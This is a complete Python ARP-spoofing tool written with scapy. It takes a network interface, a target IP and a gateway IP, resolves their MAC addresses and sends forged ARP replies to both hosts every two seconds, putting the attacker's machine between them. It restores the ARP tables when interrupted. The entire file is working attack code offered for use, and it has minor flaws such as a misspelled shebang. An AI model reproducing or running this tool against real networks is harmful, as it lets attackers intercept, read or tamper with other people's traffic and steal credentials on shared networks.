#!/usr/bin/env pyhton

import argparse
import scapy.all as scapy
import time
import sys,os

def check_root():
    if os.geteuid() != 0:
        print("Please run the script as root.")
        sys.exit()
        
def check_interface_exists(interface):
    """Check if the interface exists on the system."""
    interfaces = os.listdir('/sys/class/net/')
    if interface not in interfaces:
        print("Error: Interface '{}' not present on this system.".format(interface))
        print("Available interfaces: {}".format(', '.join(interfaces)))
        sys.exit(1)
        
def get_arguments():
    parser = argparse.ArgumentParser()
        #parser = optparse.OptionParser()
    parser.add_argument(dest="interface", help="Interface")
    parser.add_argument(dest="target", help="Target IP")
    parser.add_argument(dest="gateway", help="Spoof IP ")
        #parser.add_option("-t", "--target", dest="target", help="Target IP / IP range")
    options = parser.parse_args()
        #(options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please Specify Interface, target and spoof IP, use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("[!] Failed to get MAC address for " + ip + " ")
        sys.exit(1)

def spoof(iface, target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #op=2 is response, and op=1 is request
    scapy.sendp(packet, iface=iface, verbose=False)

def restore(iface, destination_ip, source_ip):
    #we are writing this function to instantly restore arp table after quitting else it would take some time to reflect
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip)
    scapy.sendp(packet, iface=iface, count=4, verbose=False)

check_root()

arguments = get_arguments()
i = arguments.interface
t = arguments.target
g = arguments.gateway

check_interface_exists(i)

try:
    packets_sent_count = 0
    while True:
        spoof(i, t, g)
        spoof(i, g, t)
        packets_sent_count = packets_sent_count + 2
        print("\r[+] Sent " + str(packets_sent_count), end=""),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl+C ... Restoring ARP table...")
    restore(i, t, g)
    restore(i, g, t)



